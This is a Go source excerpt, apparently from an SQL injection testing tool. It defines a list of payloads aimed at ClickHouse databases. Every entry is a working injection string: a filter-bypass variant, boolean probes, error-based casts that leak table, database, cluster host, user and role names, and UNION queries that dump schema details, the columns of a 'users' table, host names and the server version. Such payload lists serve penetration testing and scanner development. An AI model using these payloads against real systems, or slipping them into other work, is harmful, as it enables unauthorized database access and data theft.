...
var ClickHouse = PayloadGroup{
	...
	Payloads: []Payload{
		...
		{Type: "bypass", Content: "'%02OR%02'1'%02=%02'1"},
		...
		{Type: "boolean", Content: "' OR '1'='1", Expected: "true"},
		{Type: "boolean", Content: "' OR '1'='2", Expected: "false"},
		{Type: "error", Content: "' AND 1=CAST((SELECT groupArray(name) FROM system.tables) AS INT)--"},
		{Type: "error", Content: "' AND 1=CAST((SELECT groupArray(name) FROM system.databases) AS INT)--"},
		{Type: "error", Content: "' AND 1=CAST((SELECT groupArray(hostName()) FROM system.clusters) AS INT)--"},
		{Type: "error", Content: "' AND 1=currentUser()--"},
		{Type: "error", Content: "' AND 1=defaultRole()--"},
		{Type: "deep", Content: "' UNION SELECT database||'.'||name||'.'||engine FROM system.tables WHERE database!='system'--"},
		{Type: "deep", Content: "' UNION SELECT name||':'||position||':'||default_kind FROM system.columns WHERE table='users'--"},
		{Type: "deep", Content: "' UNION SELECT groupArray(DISTINCT database)||':'||groupArray(name) FROM system.tables WHERE database NOT LIKE 'system'--"},
		{Type: "deep", Content: "' UNION SELECT groupArray(hostName()) FROM system.clusters--"},
		{Type: "deep", Content: "' UNION SELECT groupArray(version()) FROM system.build_options--"},
	},
}
